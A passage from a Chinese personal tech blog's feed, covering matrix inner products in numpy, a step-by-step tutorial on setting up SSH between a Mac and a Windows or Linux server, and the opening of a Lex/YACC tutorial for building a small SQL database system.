</code></pre></div></div> <h1 id="frobenius乘积">Frobenius乘积</h1> <p><em>比较少见</em></p> <p>在数学中，弗罗比尼乌斯内积(Frobenius inner product)是一种基于两个矩阵的二元运算，结果是一个数值。它常常被记为 $&lt;A,B&gt;_F$ 。这个运算是一个将矩阵视为向量的<strong>逐元素内积</strong>。参与运算的两个矩阵必须有相同的维度、行数和列数，但不局限于方阵。</p> <table> <thead> <tr> <th>别名</th> <th>英文</th> <th>数学符号</th> <th>numpy API</th> </tr> </thead> <tbody> <tr> <td><strong>弗罗比尼乌斯内积</strong></td> <td><strong>Frobenius inner product</strong></td> <td>$&lt;A,B&gt;_F$</td> <td><code class="language-plaintext highlighter-rouge">numpy.vdot</code></td> </tr> </tbody> </table> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span>
<span class="nf">array</span><span class="p">([[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">b</span>
<span class="nf">array</span><span class="p">([[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
       <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">]])</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">np</span><span class="p">.</span><span class="nf">vdot</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="mi">13</span>
</code></pre></div></div>]]></content><author><name>Chen Yeung</name></author><category term="杂项"/><category term="python"/><category term="numpy"/><category term="math"/><category term="linear"/><category term="matrix"/><summary type="html"><![CDATA[一文解释清楚点乘、叉乘、矩阵乘法、Hadamard乘积等以及对应Numpy接口]]></summary></entry><entry><title type="html">SSH连接远程服务器终极教程</title><link href="https://iamnotphage.github.io/blog/2024/sshTutorial/" rel="alternate" type="text/html" title="SSH连接远程服务器终极教程"/><published>2024-12-05T00:00:00+00:00</published><updated>2024-12-05T00:00:00+00:00</updated><id>https://iamnotphage.github.io/blog/2024/sshTutorial</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2024/sshTutorial/"><![CDATA[<p>记录一下配置和使用ssh遇到的所有坑！</p> <p>本人测试设备:</p> <ul> <li>Macbook (Apple Silicon)</li> <li>Windows11 笔记本</li> </ul> <p>阅读并理解本文需要的前置知识或技能:</p> <ul> <li>Linux基础命令(<code class="language-plaintext highlighter-rouge">|</code>, <code class="language-plaintext highlighter-rouge">grep</code>等)</li> <li>科学上网</li> <li>清楚知道自己主机登陆账户和密码(Windows上不是PIN码，而是登陆密码!)</li> </ul> <h1 id="ssh-科普">SSH 科普</h1> <p>安全外壳协议（Secure Shell Protocol，简称SSH）是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。SSH通过在网络中建立安全隧道来实现SSH客户端与服务器之间的连接。SSH最常见的用途是远程登录系统，人们通常利用SSH来传输命令行界面和远程执行命令。</p> <p>比如你有一台不方便移动的主机，但是算力资源很好，你需要远程操控，那么就可以试试SSH</p> <p>事实上，很多企业以及实验室都是这么操作的，以及很多云服务器。</p> <p>因为大部分时候，作为开发者，并不需要太多图形化界面，只需要一个终端。</p> <h1 id="ssh教程">SSH教程</h1> <p>下面的教程步骤将基于<strong>Mac SSH Windows</strong>的需求来写。</p> <h2 id="windows-ssh-server安装">Windows SSH Server安装</h2> <p>一般都是用<code class="language-plaintext highlighter-rouge">OpenSSH-Server</code></p> <p>在Windows上安装<code class="language-plaintext highlighter-rouge">OpenSSH-Server</code>:</p> <p>安装方式还是挺多的，一个是打开<code class="language-plaintext highlighter-rouge">设置-系统-可选功能</code>然后查看是否有<code class="language-plaintext highlighter-rouge">OpenSSH</code>字样。</p> <p>一般都会有一个<code class="language-plaintext highlighter-rouge">OpenSSH Client</code>，但是这里Windows是作为服务器</p> <p>点击<code class="language-plaintext highlighter-rouge">添加功能</code>，搜索<code class="language-plaintext highlighter-rouge">OpenSSH Server</code>安装</p> <p>然后在<code class="language-plaintext highlighter-rouge">服务</code>中(运行<code class="language-plaintext highlighter-rouge">services.msc</code>)找到<code class="language-plaintext highlighter-rouge">OpenSSH 服务器</code>启动选项设置为<code class="language-plaintext highlighter-rouge">自动</code></p> <p>即可。</p> <p>接下来采用命令行安装，如果前面没问题这里可以跳过。</p> <p>管理员身份打开<code class="language-plaintext highlighter-rouge">PowerShell</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WindowsCapability <span class="nt">-Online</span> | Where-Object Name <span class="nt">-like</span> <span class="s1">'OpenSSH*'</span>
</code></pre></div></div> <p>如果返回</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Name  : OpenSSH.Client~~~~0.0.1.0
 State : Installed

 Name  : OpenSSH.Server~~~~0.0.1.0
 State : Installed
</code></pre></div></div> <p>那就是都安装好了，如果<code class="language-plaintext highlighter-rouge">Server</code>显示<code class="language-plaintext highlighter-rouge">Not Present</code>就是没安装<code class="language-plaintext highlighter-rouge">OpenSSH Server</code></p> <p>用下面的命令安装:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-WindowsCapability <span class="nt">-Online</span> <span class="nt">-Name</span> OpenSSH.Server~~~~0.0.1.0
<span class="c"># 如果客户端也没安装，上面的Server改成Client</span>
</code></pre></div></div> <p>接下来命令行启动ssh服务并设置相关启动选项和防火墙设置</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 启动sshd服务</span>
Start-Service sshd

<span class="c"># 设置启动选项</span>
Set-Service <span class="nt">-Name</span> sshd <span class="nt">-StartupType</span> <span class="s1">'Automatic'</span>

<span class="c"># 防火墙设置</span>
<span class="k">if</span> <span class="o">(!(</span>Get-NetFirewallRule <span class="nt">-Name</span> <span class="s2">"OpenSSH-Server-In-TCP"</span> <span class="nt">-ErrorAction</span> SilentlyContinue | Select-Object Name, Enabled<span class="o">))</span> <span class="o">{</span>
    Write-Output <span class="s2">"Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."</span>
    New-NetFirewallRule <span class="nt">-Name</span> <span class="s1">'OpenSSH-Server-In-TCP'</span> <span class="nt">-DisplayName</span> <span class="s1">'OpenSSH Server (sshd)'</span> <span class="nt">-Enabled</span> True <span class="nt">-Direction</span> Inbound <span class="nt">-Protocol</span> TCP <span class="nt">-Action</span> Allow <span class="nt">-LocalPort</span> 22
<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
    Write-Output <span class="s2">"Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."</span>
<span class="o">}</span>
</code></pre></div></div> <hr/> <p>手动安装的方法略。</p> <h2 id="linux-ssh-server安装">Linux SSH Server安装</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemctl status sshd <span class="c"># 查看sshd是否安装</span>
apt <span class="nb">install </span>openssh-server <span class="c"># 没有的话就apt安装 或者你所常用的包管理工具</span>
systemctl <span class="nb">enable </span>sshd <span class="nt">--now</span>
systemctl status sshd <span class="c"># 确保安装</span>
</code></pre></div></div> <h2 id="ssh-server端配置">SSH Server端配置</h2> <p>接下来配置服务器和客户端。</p> <p>安装好并启动之后，需要知道几个前置的内容。</p> <p>在服务器上，有两组文件夹需要注意:</p> <table> <thead> <tr> <th>特性</th> <th>C:\Users[name].ssh\</th> <th>C:\ProgramData\ssh</th> </tr> </thead> <tbody> <tr> <td>级别</td> <td>用户级别</td> <td>系统级别</td> </tr> <tr> <td>作用范围</td> <td>当前用户的 SSH 配置和密钥管理</td> <td>全局 SSH 服务与主机密钥管理</td> </tr> <tr> <td>配置文件</td> <td>config用户自定义 SSH 客户端配置</td> <td>sshd_config 服务端配置</td> </tr> <tr> <td>密钥</td> <td>用户的私钥、公钥（如 id_rsa）</td> <td>服务端主机密钥</td> </tr> <tr> <td>使用场景</td> <td>用户发起 SSH 连接时</td> <td>SSH 服务端运行和全局配置</td> </tr> </tbody> </table> <p>如果是linux-like的系统，第一个文件夹是<code class="language-plaintext highlighter-rouge">/home/[name]/.ssh</code>（实际上都是<code class="language-plaintext highlighter-rouge">~/.ssh</code>）；第二个文件是<code class="language-plaintext highlighter-rouge">/etc/ssh</code></p> <p>这里windows为例子，接下来继续。</p> <p>目前不太需要配置<code class="language-plaintext highlighter-rouge">sshd_config</code>文件，后续根据自己需求更改验证方式即可。</p> <h2 id="ssh-clinet端配置">SSH Clinet端配置</h2> <p>在我们的Mac上(也就是这里的客户端)，需要配置一些内容。</p> <p>这里跳过<code class="language-plaintext highlighter-rouge">ssh-keygen</code>的过程，如果你有用过github的话，基本上都已经生成过密钥了。</p> <p>(注意如果你之前在<code class="language-plaintext highlighter-rouge">ssh-keygen</code>过程中输入过密码的设置，后续你可能需要这个密码)</p> <p>那么这里就是第一次连接我们的服务器(Windows):</p> <h2 id="局域网ssh">局域网SSH</h2> <p>假设我windows的局域网ip是<code class="language-plaintext highlighter-rouge">192.168.0.194</code></p> <p>在mac上(or Linux)，打开终端。</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> ~/.ssh/id_rsa.pub
</code></pre></div></div> <p>查看自己公钥，然后想办法保存到服务器的<code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code>中（没有就创建，注意没有后缀）</p> <p>或者直接用<code class="language-plaintext highlighter-rouge">ssh-copy-id -i ~/.ssh/id_rsa.pub username@ip</code>(username@ip根据自己实际情况改变)</p> <p>然后连接:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh username@192.168.0.194 <span class="c"># username根据自己情况</span>
</code></pre></div></div> <p>首次连接会有连接过程。输入yes继续。</p> <p>不出意外的话可以连接上</p> <p>但是每次都输入<code class="language-plaintext highlighter-rouge">username</code>和<code class="language-plaintext highlighter-rouge">ip</code>实在是太麻烦了</p> <p>可以在客户端上配置<code class="language-plaintext highlighter-rouge">config</code>文件</p> <p>在<code class="language-plaintext highlighter-rouge">/Users/[name]/.ssh</code>文件中</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim config
</code></pre></div></div> <p>我的如下，可以参考:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host LAN-WIN
	HostName 192.168.0.194
	User	iamnotphage@gmail.com
	Port	22
	IdentityFile ~/.ssh/id_rsa
</code></pre></div></div> <p>根据自己情况更改就好。</p> <p>后续只需要这样连接(局域网的话)</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh LAN-WIN
</code></pre></div></div> <p>这样就不需要手动输入user@ip或者是指定端口了（不指定默认22）</p> <h2 id="内网穿透">内网穿透</h2> <p>我想大部分情况都不是局域网吧，所以需要内网穿透。</p> <p><em>让我想起小时候用蛤蟆吃联机 缅怀Hamachi。</em></p> <p>这里不多详解了，我个人用的是<code class="language-plaintext highlighter-rouge">Sakura FRP</code>这个软件</p> <p>FRP: Fast Reverse Proxy</p> <p>在服务器上配置一下，绑定端口22（如果你没修改的话）</p> <p>然后FRP的软件给你一个公网ip和端口。后续你就这么连接就行:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-p</span> <span class="o">[</span>port] user@ip
</code></pre></div></div> <p>当然也可以配置<code class="language-plaintext highlighter-rouge">config</code>文件，避免后续重复输入</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host myWindows
	HostName 这里输入公网ip或域名
	User	iamnotphage@gmail.com
	Port	[port]
	IdentityFile ~/.ssh/id_rsa
</code></pre></div></div> <p>后续就是<code class="language-plaintext highlighter-rouge">ssh myWindows</code>就行了</p> <h1 id="问题汇总解决方案">问题汇总&amp;解决方案</h1> <h2 id="修改配置文件后权限改变">修改配置文件后权限改变</h2> <p>在Windows上，找到<code class="language-plaintext highlighter-rouge">OpenSSH</code>的安装目录。</p> <p>我这里是<code class="language-plaintext highlighter-rouge">D:\MyToolkit\OpenSSH-Win64</code></p> <p>然后在此目录下管理员权限打开<code class="language-plaintext highlighter-rouge">PowerShell</code>:</p> <p>该目录下有两个修复权限的脚本文件(<code class="language-plaintext highlighter-rouge">.ps1</code>后缀)</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./FixHostFilePermissions.ps1
./FixUserFilePermissions.ps1
</code></pre></div></div> <p>如果是linux系统的话<code class="language-plaintext highlighter-rouge">chmod</code>就行</p> <h2 id="发生系统错误-5">发生系统错误 5</h2> <p>孩子，管理员权限打开终端。</p> <h2 id="发生系统错误-1067">发生系统错误 1067</h2> <p>当在windows上试图重启sshd服务时，会出现</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>windows <span class="o">&gt;</span> net start sshd
OpenSSH SSH Server 服务无法启动。

系统出错。

发生系统错误 1067。

进程意外终止。
</code></pre></div></div> <p><strong>解决方案</strong></p> <ol> <li>首先确保权限正确: 在<code class="language-plaintext highlighter-rouge">.\FixHostFilePermission.ps</code></li> <li>如果1不行那就删除<code class="language-plaintext highlighter-rouge">C:/ProgramData/ssh</code>文件夹，重新运行指令。</li> </ol> <h2 id="permission-denied">Permission Denied</h2> <p>一直没啥变化但是突然不行了</p> <p>客户端确保公钥正确上传到服务器的<code class="language-plaintext highlighter-rouge">authorized_keys</code></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-R</span> <span class="o">[</span>name] <span class="c"># 这里填写自己的域名</span>
<span class="c"># 这里会清除 ~/.ssh/known_hosts的相关条目</span>
</code></pre></div></div> <p>是在不行就删除<code class="language-plaintext highlighter-rouge">C:/ProgramData/ssh</code>文件夹重启sshd服务。</p>]]></content><author><name></name></author><category term="杂项"/><category term="ssh"/><category term="tutorial"/><summary type="html"><![CDATA[本文描述了ssh相关知识，ssh远程连接服务器步骤，以及所有坑的解决方案]]></summary></entry><entry><title type="html">my DBMS</title><link href="https://iamnotphage.github.io/blog/2024/myDBMS/" rel="alternate" type="text/html" title="my DBMS"/><published>2024-05-17T15:59:00+00:00</published><updated>2024-05-17T15:59:00+00:00</updated><id>https://iamnotphage.github.io/blog/2024/myDBMS</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2024/myDBMS/"><![CDATA[<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  /$$$$$$  /$$   /$$ /$$$$$$$$ /$$   /$$
 /$$__  $$| $$  | $$| $$_____/| $$$ | $$
| $$  \__/| $$  | $$| $$      | $$$$| $$
| $$      | $$$$$$$$| $$$$$   | $$ $$ $$
| $$      | $$__  $$| $$__/   | $$  $$$$
| $$    $$| $$  | $$| $$      | $$\  $$$
|  $$$$$$/| $$  | $$| $$$$$$$$| $$ \  $$
 \______/ |__/  |__/|________/|__/  \__/
</code></pre></div></div> <p>设计并实现一个DBMS原型系统，可以接受基本的SQL语句，对其进行词法分析、语法分析，然后解释执行SQL语句，完成对数据库文件的相应操作，实现DBMS的基本功能。</p> <p>ps: 以下<code class="language-plaintext highlighter-rouge">教科书</code>特指<code class="language-plaintext highlighter-rouge">西电出版社的《编译原理》</code></p> <h1 id="效果演示">效果演示</h1> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-05-17/demo-480.webp 480w,/assets/img/2024-05-17/demo-800.webp 800w,/assets/img/2024-05-17/demo-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-05-17/demo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h1 id="环境说明">环境说明</h1> <ul> <li>windows11</li> <li>GCC/G++ 8.1.0</li> <li>Lex(Flex) 2.5.4a</li> <li>YACC(Bison) 2.4.1</li> <li>CLion 2023</li> <li>VSCode 插件<code class="language-plaintext highlighter-rouge">Yash</code>可以高亮Lex和YACC语法</li> </ul> <p>lex和yacc在UNIX中是标配，所以windows用户需要自己去下载，而linux或者macos用户会方便一些。</p> <p>下面贴出GNU官方的下载地址。</p> <p><a href="https://gnuwin32.sourceforge.net/packages/flex.htm">Flex Download</a></p> <p><a href="https://gnuwin32.sourceforge.net/packages/bison.htm">Bison Download</a></p> <p>安装之后需要配置环境变量，将<code class="language-plaintext highlighter-rouge">bin</code>目录添加到系统环境变量就行了。</p> <p>配置好环境变量后，cmd终端能够找到<code class="language-plaintext highlighter-rouge">bison.exe</code>和<code class="language-plaintext highlighter-rouge">flex.exe</code>，所以能够执行命令，查看一下版本号看看配置是否正确。</p> <h1 id="前置知识">前置知识</h1> <ol> <li>CMake相关的前置知识: <a href="https://www.jetbrains.com/help/clion/quick-cmake-tutorial.html">Quick CMake Tutorial</a></li> <li>正则表达式: <a href="https://ftp.gnu.org/old-gnu/Manuals/flex-2.5.4/html_mono/flex.html#SEC7">flex官方说明</a> 或教科书</li> <li>Lex程序基本结构: <a href="https://ftp.gnu.org/old-gnu/Manuals/flex-2.5.4/html_mono/flex.html#SEC5">简单程序演示</a> 或教科书2.5章</li> <li>YACC程序基本结构: <a href="https://www.gnu.org/software/bison/manual/bison.html">YACC官方文档</a></li> </ol> <h1 id="lex源程序说明">Lex源程序说明</h1> <p>Lex用来生成<code class="language-plaintext highlighter-rouge">词法分析器</code>（词法分析器生成器），能识别正规式，并执行给定的动作。输出的文件是<code class="language-plaintext highlighter-rouge">.yy.c</code>后缀。</p> <h2 id="lex源程序结构">Lex源程序结构</h2> <p>Lex源程序的结构被<code class="language-plaintext highlighter-rouge">%%</code>符号分为三/四部分(查看教科书2.5章):</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="p">{</span>
<span class="n">Declarations</span>
<span class="o">%</span><span class="p">}</span>
<span class="n">Definitions</span>
<span class="o">%%</span>
<span class="n">Rules</span>
<span class="o">%%</span>
<span class="n">User</span> <span class="n">subroutines</span>
</code></pre></div></div> <ol> <li>Declarations段包含一些C的头文件，宏定义，函数声明，全局变量声明</li> <li>Definitions段包含一些 <code class="language-plaintext highlighter-rouge">正则表达式</code> 的名字 (比如<code class="language-plaintext highlighter-rouge">digit [0-9]</code>，digit是名字)</li> <li>Rules段定义<code class="language-plaintext highlighter-rouge">{patterns} {actions}</code>每一个模式串（正则表达式）对应一个动作（C代码片段）</li> <li>User subroutines段可以定义函数</li> </ol> <p>比如上述文件名为<code class="language-plaintext highlighter-rouge">lex.l</code></p> <p>通过命令<code class="language-plaintext highlighter-rouge">flex lex.l</code>生成<code class="language-plaintext highlighter-rouge">lex.yy.c</code>文件，再<code class="language-plaintext highlighter-rouge">gcc</code>编译生成<code class="language-plaintext highlighter-rouge">.exe</code>文件，就能对输入记号流进行词法分析。</p> <h2 id="全局变量函数">全局变量/函数</h2> <p><strong>分析源码，需要注意Lex程序中常用的几个全局变量和函数</strong></p> <table> <thead> <tr> <th>全局变量/函数</th> <th>说明</th> </tr> </thead> <tbody> <tr> <td>char *yytext</td> <td>输入序列(字符串)</td> </tr> <tr> <td>int yyleng</td> <td>输入序列的长度</td> </tr> <tr> <td>int yylex()</td> <td>词法分析驱动器的入口，扫描输入序列后，匹配到<code class="language-plaintext highlighter-rouge">正则表达式</code>(最长的那一条)，执行对应的<code class="language-plaintext highlighter-rouge">C代码</code>，返回代码段返回的值(代码段没写返回值yylex()默认返回0)，也就是每个token的标号。</td> </tr> <tr> <td>int yywrap()</td> <td>词法分析器分析结束时，自动调用yywrap()。如果其返回值为1，则结束分析过程；如果返回值为0，则继续扫描下一个输入。</td> </tr> </tbody> </table> <h2 id="例子">例子</h2> <p>例子（或参考编译原理2.5章节）：</p> <p><strong>识别输入序列，输出记号类型:</strong></p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="p">{</span>
    <span class="cp">#define ID 0
</span>    <span class="cp">#define NUMBER 1
</span><span class="o">%</span><span class="p">}</span>

<span class="kt">char</span> <span class="p">[</span><span class="n">a</span><span class="o">-</span><span class="n">zA</span><span class="o">-</span><span class="n">Z</span><span class="p">]</span>
<span class="n">digit</span> <span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span>
<span class="n">digits</span> <span class="p">{</span><span class="n">digit</span><span class="p">}</span><span class="o">+</span>
<span class="n">optional_fraction</span> <span class="p">(</span><span class="s">"."</span><span class="p">{</span><span class="n">digits</span><span class="p">})</span><span class="o">?</span>
<span class="n">optional_exponent</span> <span class="p">(</span><span class="n">E</span><span class="p">[</span><span class="o">+-</span><span class="p">]</span><span class="o">?</span><span class="p">{</span><span class="n">digits</span><span class="p">})</span><span class="o">?</span>

<span class="o">%%</span>
<span class="p">{</span><span class="kt">char</span><span class="p">}({</span><span class="kt">char</span><span class="p">}</span><span class="o">|</span><span class="p">{</span><span class="n">digit</span><span class="p">})</span><span class="o">*</span> <span class="p">{</span><span class="n">printf</span><span class="p">(</span><span class="s">"identified a ID %s: length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">yytext</span><span class="p">,</span> <span class="n">yyleng</span><span class="p">);</span>
                         <span class="k">return</span> <span class="n">ID</span><span class="p">;}</span>

<span class="p">{</span><span class="n">digits</span><span class="p">}{</span><span class="n">optional_fraction</span><span class="p">}{</span><span class="n">optional_exponent</span><span class="p">}</span> <span class="p">{</span><span class="n">printf</span><span class="p">(</span><span class="s">"identified a NUMBER %s: length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">yytext</span><span class="p">,</span> <span class="n">yyleng</span><span class="p">);</span>
                                                <span class="k">return</span> <span class="n">NUMBER</span><span class="p">;}</span>

<span class="o">%%</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Done, token type: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">yylex</span><span class="p">());</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">yywrap</span><span class="p">(){</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>文件名为<code class="language-plaintext highlighter-rouge">mylexer.l</code>，运行步骤(Windows):</p> <ol> <li>lex源程序编译: <code class="language-plaintext highlighter-rouge">flex .\mylexer.l</code></li> <li>对生成的C源文件<code class="language-plaintext highlighter-rouge">lex.yy.c</code>编译: <code class="language-plaintext highlighter-rouge">gcc lex.yy.c</code></li> <li>运行编译完的可执行文件<code class="language-plaintext highlighter-rouge">a.exe</code>: <code class="language-plaintext highlighter-rouge">.\a.exe</code></li> </ol> <p>程序可以识别两类记号，一种是标识符，一种是数字.</p> <p>若识别到正则表达式对应的字符串，执行对应的C代码.</p> <p>main()函数将自动调用生成的yylex()函数。</p> <p>yylex()执行完之后询问yywrap()，是否需要再扫描后续输入。</p> <h1 id="yacc源程序说明">YACC源程序说明</h1> <p>Yet Another Compiler Compiler.</p> <p>语法分析器生成器。识别手工设计的产生式(Productions)执行对应的语义动作。文件后缀<code class="language-plaintext highlighter-rouge">.y</code>，输出文件后缀<code class="language-plaintext highlighter-rouge">.tab.c</code></p> <h2 id="yacc源程序结构">YACC源程序结构</h2> <p>YACC源程序的结构也是类似的三/四段(查看教科书3.5章)</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="p">{</span>
<span class="n">Declarations</span>
<span class="o">%</span><span class="p">}</span>
<span class="n">Definitions</span>
<span class="o">%%</span>
<span class="n">Productions</span>
<span class="o">%%</span>
<span class="n">User</span> <span class="n">subroutines</span>
</code></pre></div></div> <p>这里<code class="language-plaintext highlighter-rouge">Declarations</code>和<code class="language-plaintext highlighter-rouge">User subroutines</code>和lex源程序是一样的作用。</p> <p>特别说明的是<code class="language-plaintext highlighter-rouge">Definitions</code>段和<code class="language-plaintext highlighter-rouge">Productions</code>段。</p> <p>前者比lex源码多了一些YACC转有的变量，后者是定义语法产生式(一说文法，都是grammar)，并且与手写的符号不太一样。</p> <h2 id="关于definitions段">关于Definitions段</h2> <p><strong>改变yylval的默认类型</strong></p> <p>查看下面的表格，yylval默认类型其实是int，但是在yacc源文件中可以这样定义他的union从而实现自定义。</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="k">union</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">intval</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">chval</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>yacc允许yylex()通过yylval传递值：</p> <p>yacc定义了yylval的union，它将会把yylval的定义写到<code class="language-plaintext highlighter-rouge">y.tab.h</code>中，所以当<code class="language-plaintext highlighter-rouge">.l</code>文件中引用了<code class="language-plaintext highlighter-rouge">.tab.h</code>头文件之后，能够给yylval赋值。（详情查看后续lex和yacc联合使用）</p> <p><strong>非终结符</strong></p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="n">type</span><span class="o">&lt;</span><span class="n">chval</span><span class="o">&gt;</span> <span class="n">tableName</span> <span class="c1">// 这里chval是上述联合体中定义的char *chval</span>
</code></pre></div></div> <p>在后续语法定义中tableName将作为非终结符，这意味着他可以进一步推导。</p> <p><strong>终结符</strong></p> <p>用<code class="language-plaintext highlighter-rouge">token</code>定义</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="n">token</span> <span class="n">NUMBER</span>
</code></pre></div></div> <p><strong>结合性和优先级</strong></p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="n">left</span> <span class="sc">'+'</span> <span class="sc">'-'</span>
<span class="o">%</span><span class="n">left</span> <span class="sc">'*'</span> <span class="sc">'/'</span>
</code></pre></div></div> <p>变量<code class="language-plaintext highlighter-rouge">left</code>代表左结合，同一行的符号优先级相同。下面行的优先级比上面行的高。</p> <h2 id="关于productions段">关于Productions段</h2> <p>除了一般的文法，还要注意YACC默认把第一条产生式当作开始的产生式。</p> <p><strong>这一点非常重要！</strong></p> <p>下面举例说明：</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Productions段</span>
<span class="n">createStatement</span><span class="o">:</span>
    <span class="n">CREATE</span> <span class="n">TABLE</span> <span class="n">tableName</span> <span class="sc">';'</span>
    <span class="p">;</span>

<span class="n">queryStatement</span><span class="o">:</span>
    <span class="n">SELECT</span> <span class="n">columnName</span> <span class="n">FROM</span> <span class="n">tableName</span> <span class="sc">';'</span>
    <span class="p">;</span>

<span class="c1">//如果后面还有文法产生式，也将因为无法从S推导，而无法识别</span>
</code></pre></div></div> <p>如果先读取到了<code class="language-plaintext highlighter-rouge">SELECT</code>语句，将无法识别，因为一切语法分析要从第一条产生式开始。</p> <p>所以在上述例子中，最好是这样定义Productions段:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Productions段</span>
<span class="n">statements</span><span class="o">:</span>
    <span class="n">createStatement</span>
    <span class="o">|</span> <span class="n">queryStatement</span>
    <span class="p">;</span>

<span class="n">createStatement</span><span class="o">:</span>
    <span class="n">CREATE</span> <span class="n">TABLE</span> <span class="n">tableName</span> <span class="sc">';'</span>
    <span class="p">;</span>

<span class="n">queryStatement</span><span class="o">:</span>
    <span class="n">SELECT</span> <span class="n">columnName</span> <span class="n">FROM</span> <span class="n">tableName</span> <span class="sc">';'</span>
    <span class="p">;</span>
</code></pre></div></div> <p>这样第一条产生式就可以有多种选择。</p> <h2 id="全局变量函数-1">全局变量/函数</h2> <table> <thead> <tr> <th>全局变量/函数</th> <th>说明</th> </tr> </thead> <tbody> <tr> <td>YYSTYPE yylval</td> <td>YYSTYPE类型（其实就是int），默认是int，可以通过union自定义。存储当前词法单元的属性值</td> </tr> <tr> <td>char *yytext</td> <td>同lex中的yytext，指向当前匹配的输入字符串</td> </tr> <tr> <td>int yyleng</td> <td>同lex中的yyleng，表示当前匹配的输入字符串的长度</td> </tr> <tr> <td>int yylex()</td> <td>同lex中的yylex()，词法分析器函数</td> </tr> <tr> <td>int yyparse()</td> <td>语法分析器函数，解析输入内容，并根据语法规则执行对应代码。返回值有三种:YYACCEPT(0)、YYABORT(1)、YYNOMEM(2)分别代表接受、语法错误、内存不足的情况。</td> </tr> <tr> <td>void yyerror()</td> <td>错误处理，用户自定义</td> </tr> <tr> <td>int yywrap()</td> <td>同lex中的yywrap()，返回1表示输入结束，0表示还有输入</td> </tr> </tbody> </table> <p><strong>特别地，在产生式中，对应的动作</strong>（也就是对应的C代码段，原文actions）可以使用<code class="language-plaintext highlighter-rouge">$</code>符号指代产生式的左部或者右部的某个符号。</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="mi">1</span><span class="err">、$</span><span class="mi">2</span> <span class="err">和</span> <span class="err">$$</span> <span class="err">的使用</span>
<span class="err">$</span><span class="n">n</span><span class="err">：用于访问产生式右侧第</span> <span class="n">n</span> <span class="err">个符号的值。$</span><span class="mi">1</span> <span class="err">表示第一个符号的值，$</span><span class="mi">2</span> <span class="err">表示第二个符号的值，依此类推。</span>
<span class="err">$$：用于表示产生式左侧非终结符的值。</span>

<span class="p">......</span><span class="err">前文省略</span>
<span class="o">%%</span>

